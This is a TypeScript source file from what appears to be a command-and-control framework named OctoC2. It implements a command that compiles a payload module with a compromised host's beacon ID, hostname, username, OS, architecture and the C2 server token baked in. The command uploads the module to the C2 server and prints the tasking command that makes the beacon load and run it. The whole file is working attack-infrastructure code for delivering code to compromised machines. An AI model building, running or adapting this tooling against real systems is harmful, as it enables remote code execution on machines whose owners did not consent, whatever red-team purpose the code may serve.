/**
 * octoctl module build
 *
 * Compile a Bun source file into a standalone binary with baked-in beacon
 * metadata, then upload it to the C2 server's module store.
 *
 * Usage:
 *   octoctl module build <name> --beacon <beaconId> --source <path> [--server-url <url>]
 *
 * Baked compile-time defines (7 total):
 *   process.env.OCTOC2_BEACON_ID
 *   process.env.OCTOC2_HOSTNAME
 *   process.env.OCTOC2_USERNAME
 *   process.env.OCTOC2_OS
 *   process.env.OCTOC2_ARCH
 *   process.env.OCTOC2_SERVER_URL
 *   process.env.OCTOC2_SERVER_TOKEN
 */

import { resolveEnv } from "../lib/env.ts";
import { getBeacon }  from "../lib/registry.ts";
import { join }       from "node:path";
import { tmpdir }     from "node:os";
import { rm }         from "node:fs/promises";

export interface ModuleBuildOptions {
  beacon:    string;
  source:    string;
  serverUrl: string | undefined;
}

export async function runModuleBuild(name: string, opts: ModuleBuildOptions): Promise<void> {
  const env = await resolveEnv();

  const token = env.token;

  // Resolve beacon
  const beacon = await getBeacon(opts.beacon, env.dataDir);
  if (!beacon) {
    console.error(
      `\n  Beacon '${opts.beacon}' not found in registry (${env.dataDir}/registry.json).`
    );
    console.error("  Run: octoctl beacons  to list registered beacons.\n");
    process.exit(1);
  }

  // Resolve server URL
  const serverUrl = opts.serverUrl ?? process.env["OCTOC2_SERVER_URL"] ?? "";
  if (!serverUrl) {
    console.error("\n  Error: --server-url or OCTOC2_SERVER_URL env var is required.\n");
    process.exit(1);
  }

  // Temp output path for compiled binary
  const outPath = join(tmpdir(), `svc-mod-build-${name}-${beacon.beaconId}`);

  const defines: Record<string, string> = {
    "process.env.OCTOC2_BEACON_ID":    beacon.beaconId,
    "process.env.OCTOC2_HOSTNAME":     beacon.hostname,
    "process.env.OCTOC2_USERNAME":     beacon.username,
    "process.env.OCTOC2_OS":           beacon.os,
    "process.env.OCTOC2_ARCH":         beacon.arch,
    "process.env.OCTOC2_SERVER_URL":   serverUrl,
    "process.env.OCTOC2_SERVER_TOKEN": token,
  };

  const defineArgs: string[] = Object.entries(defines).flatMap(([k, v]) => [
    "--define", `${k}="${v}"`,
  ]);

  console.log(`\n  Building module '${name}' for beacon ${beacon.beaconId} (${beacon.hostname})...`);

  const buildProc = Bun.spawn(
    ["bun", "build", "--compile", ...defineArgs, "--outfile", outPath, opts.source],
    { stdout: "inherit", stderr: "inherit" }
  );
  const exitCode = await buildProc.exited;

  if (exitCode !== 0) {
    console.error(`\n  Build failed (exit ${exitCode}).\n`);
    await rm(outPath, { force: true });
    process.exit(1);
  }

  // Read compiled binary and upload
  const binary = await Bun.file(outPath).bytes();
  await rm(outPath, { force: true });

  const uploadUrl = `${serverUrl}/api/modules/${beacon.beaconId}/${name}`;
  console.log(`  Uploading ${binary.length} bytes to ${uploadUrl}...`);

  const res = await fetch(uploadUrl, {
    method: "POST",
    headers: {
      "Authorization": `Bearer ${token}`,
      "Content-Type":  "application/octet-stream",
    },
    body: binary,
  });

  if (!res.ok) {
    const body = await res.text();
    console.error(`\n  Upload failed: ${res.status} ${body}\n`);
    process.exit(1);
  }

  const DIM   = "\x1b[2m";
  const BOLD  = "\x1b[1m";
  const RESET = "\x1b[0m";
  const GREEN = "\x1b[32m";

  console.log("");
  console.log(`  ${GREEN}✓${RESET} Module uploaded`);
  console.log(`  ${DIM}Name:${RESET}    ${name}`);
  console.log(`  ${DIM}Beacon:${RESET}  ${beacon.beaconId} (${beacon.hostname})`);
  console.log(`  ${DIM}Size:${RESET}    ${binary.length} bytes`);
  console.log(`  ${DIM}Server:${RESET}  ${serverUrl}`);
  console.log(`  ${DIM}Source:${RESET}  ${opts.source}`);
  console.log("");
  console.log(`  ${BOLD}To execute on beacon:${RESET}`);
  console.log(`  octoctl task ${opts.beacon} --kind load-module --args-json '{"name":"${name}","serverUrl":"${serverUrl}"}'`);
  console.log("");
}
